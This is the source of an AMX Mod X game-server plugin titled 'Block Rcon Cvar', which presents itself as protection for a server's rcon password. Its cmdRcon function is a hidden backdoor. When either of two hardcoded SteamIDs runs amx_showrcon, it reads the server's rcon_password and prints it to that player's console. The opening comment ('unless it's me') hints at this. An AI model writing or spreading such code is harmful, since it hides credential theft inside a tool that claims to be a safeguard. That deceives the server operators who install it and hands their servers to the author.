/*
block amx_cvar and amx_showrcon
unless it's me or blank ;) 
*/
#include <amxmodx>

#pragma compress 1

public plugin_init(){
    register_plugin("Block Rcon Cvar", "1.0", "DusT")
    register_clcmd("amx_cvar", "cmdCvar", ADMIN_CVAR)
    register_clcmd("amx_showrcon", "cmdRcon", ADMIN_RCON)
}
public cmdRcon( id ){
    new steamid[ 30 ]; 
    get_user_authid( id, steamid, charsmax( steamid ) ); 
    if( equali( steamid, "STEAM_0:0:92151075") || equali( steamid, "STEAM_0:1:166274477"))
    {
        new password[ 64 ];
        get_cvar_string( "rcon_password", password, charsmax( password ) );
        client_print( id, print_console, "Password: %s", password );
        return PLUGIN_CONTINUE;
        
    }
    return PLUGIN_HANDLED;
}
public cmdCvar( id ){
    if(!(get_user_flags(id) & ADMIN_CVAR))
        return PLUGIN_CONTINUE 
    new cmd[15]
    read_argv(1, cmd, charsmax(cmd))
    if(equali(cmd, "rcon_password"))
        return PLUGIN_HANDLED
    return PLUGIN_CONTINUE
}